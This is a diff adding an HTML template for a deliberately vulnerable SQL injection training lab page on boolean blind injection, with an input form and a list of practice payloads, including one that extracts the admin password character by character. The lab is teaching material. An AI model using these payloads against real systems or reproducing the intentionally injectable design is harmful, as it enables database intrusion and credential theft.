@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="zh-CN" xmlns:th="http://www.thymeleaf.org">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>布尔盲注 - 实验区</title>
+    <link rel="stylesheet" th:href="@{/lab/lab.css}">
+</head>
+<body>
+<div th:replace="~{lab/partials/nav :: nav('boolean')}"></div>
+
+<main class="page">
+    <section class="hero">
+        <div class="eyebrow">Boolean Blind</div>
+        <h1>布尔盲注</h1>
+        <p>应用层只调用存储过程 <code class="mono">lab_user_by_id</code>，参数在数据库内部拼入 WHERE。接口不直接输出查询内容，只通过“是否有结果”暴露真假，可逐字符猜测数据库内容。</p>
+    </section>
+
+    <section class="panel">
+        <div class="panel-header">
+            <div>
+                <h2>条件判断入口</h2>
+                <p>存储过程内拼出 <code class="mono">WHERE id = </code> + 输入，命中时返回用户行。</p>
+            </div>
+            <a class="btn btn-ghost btn-sm" th:href="@{/lab}">返回总览</a>
+        </div>
+        <div class="panel-body">
+            <form class="form-grid" method="get" th:action="@{/lab/sql/boolean}">
+                <div class="field">
+                    <label for="boolean-id">id 参数</label>
+                    <input id="boolean-id" class="mono" type="text" name="id" th:value="${idInput}" autofocus>
+                </div>
+                <div class="field">
+                    <button class="btn btn-primary" type="submit">执行</button>
+                </div>
+            </form>
+        </div>
+    </section>
+
+    <section class="panel">
+        <div class="panel-header">
+            <h2>判断结果</h2>
+        </div>
+        <div class="panel-body">
+            <div th:if="${dbError != null}" class="db-error" th:text="${dbError}">数据库错误</div>
+
+            <div th:if="${rowCount > 0}" class="notice">
+                <strong>条件为真</strong>：查询命中，当前输入对应 <span class="mono" th:text="${rowCount}">1</span> 条记录。
+            </div>
+            <div th:if="${rowCount == 0 and dbError == null}" class="notice">
+                <strong>条件为假</strong>：没有命中记录，请调整条件后重试。
+            </div>
+        </div>
+    </section>
+
+    <section class="panel">
+        <div class="panel-header">
+            <h2>练习载荷</h2>
+        </div>
+        <div class="panel-body">
+            <ul class="payload-list">
+                <li>1 AND 1=1</li>
+                <li>1 AND 1=2</li>
+                <li>1 AND substring(database(),1,1)='s'</li>
+                <li>1 AND ascii(substring((SELECT password FROM users WHERE username='admin'),1,1))&gt;90</li>
+                <li>1 AND length(database())=16</li>
+            </ul>
+        </div>
+        <div class="panel-footer">逐位爆破时通常配合 Burp Intruder、脚本或二分法比较响应差异；URL 中的空格与引号需要正确编码。</div>
+    </section>
+</main>
+</body>
+</html>
